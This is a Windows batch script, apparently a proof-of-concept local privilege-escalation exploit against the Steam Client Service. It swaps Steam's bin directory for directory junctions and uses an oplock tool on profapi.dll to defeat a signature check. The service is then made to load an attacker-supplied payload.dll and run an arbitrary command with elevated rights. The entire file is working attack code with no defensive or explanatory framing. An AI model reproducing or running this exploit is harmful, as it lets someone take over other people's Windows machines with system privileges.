@echo off
set "APPPATH=%~dp0"
tasklist.exe /FI "IMAGENAME eq steam.exe" /NH | findstr steam.exe
if %ERRORLEVEL%==0 (
	echo Steam runs. Please close Steam before running this exploit.
	goto end
)

set "INSTALLPATH=DEFAULT"
for /F "skip=2 tokens=1,2*" %%p in ('reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Valve\Steam" /v InstallPath 2^>nul') do set "INSTALLPATH=%%r"
for /F "skip=2 tokens=1,2*" %%p in ('reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam" /v InstallPath 2^>nul') do set "INSTALLPATH=%%r"
if ["%INSTALLPATH%"]==["DEFAULT"] if not ["%PROGRAMFILES(X86)%"]==[] set "INSTALLPATH=%PROGRAMFILES(X86)%\Steam"
if ["%INSTALLPATH%"]==["DEFAULT"] set "INSTALLPATH=%PROGRAMFILES%\Steam"
set "BINPATH=%INSTALLPATH%\bin"
set "SVCDIR=%COMMONPROGRAMFILES%\Steam"
if not ["%COMMONPROGRAMFILES(X86)%"]==[""] set "SERVICEDIR=%COMMONPROGRAMFILES(X86)%\Steam"
set "OPLOCKTARGET=%WINDIR%\System32\profapi.dll"
if exist "%WINDIR%\SysWOW64" set "OPLOCKTARGET=%WINDIR%\SysWOW64\profapi.dll"
set "DLLNAME=SteamService.dll"
set "SVCNAME=Steam Client Service"
set "MOVEDLL=%APPPATH%\payload.dll"
set "PECMD=whoami.exe /all ^> %WINDIR%\steam_exploit.txt"
if not [%1]==[] set "PECMD=%~1"
set "MOVED=0"

echo Payload command: %PECMD%
echo Prepare exploit ...
mkdir "%APPPATH%\dummy" >nul 2>nul
copy /Y "%APPPATH%\oldupdate\*.*" "%APPPATH%\dummy\" >nul 2>nul
mkdir "%APPPATH%\target" >nul 2>nul
copy /Y "%MOVEDLL%" "%APPPATH%\target\%DLLNAME%" >nul 2>nul
move /Y "%BINPATH%" "%BINPATH%_" >nul 2>nul
echo %PECMD%> "%PROGRAMDATA%\payload.bat"

mklink /J "%BINPATH%" "%APPPATH%\dummy" >nul 2>nul
net.exe stop "%SVCNAME%" >nul 2>nul
start "SIGBYPASS" /MIN "%APPPATH%\SetOpLock.exe" "%OPLOCKTARGET%" rwdx
timeout.exe /T 1 /NOBREAK >nul 2>nul
echo Start service %SVCNAME% ...
sc.exe start "%SVCNAME%" >nul 2>nul
if not %errorlevel%==0 (
	echo Can't start Steam Client service.
	goto cleanup
)
echo Wait for serivce ...
timeout.exe /T 2 /NOBREAK >nul 2>nul

rmdir "%BINPATH%" >nul 2>nul
mklink /J "%BINPATH%" "%APPPATH%\target" >nul 2>nul
timeout.exe /T 1 /NOBREAK >nul 2>nul
taskkill.exe /IM SetOpLock.exe /FI "WINDOWTITLE eq SIGBYPASS" /F >nul 2>nul
timeout.exe /T 1 /NOBREAK >nul 2>nul
echo File "%MOVEDLL%" copied ...
set "MOVED=1"

:cleanup
echo Cleanup ...
if exist "%BINPATH%_" (
	rmdir /Q /S "%BINPATH%" >nul 2>nul
	move /Y "%BINPATH%_" "%BINPATH%" >nul 2>nul
)
rmdir /Q /S "%APPPATH%\dummy" >nul 2>nul
rmdir /Q /S "%APPPATH%\target" >nul 2>nul
timeout.exe /T 1 /NOBREAK >nul 2>nul
del /Q "%PROGRAMDATA%\payload.bat" >nul 2>nul
if not %MOVED%==1 goto end
net.exe stop "%SVCNAME%" >nul 2>nul
sc.exe start "%SVCNAME%" >nul 2>nul
:end
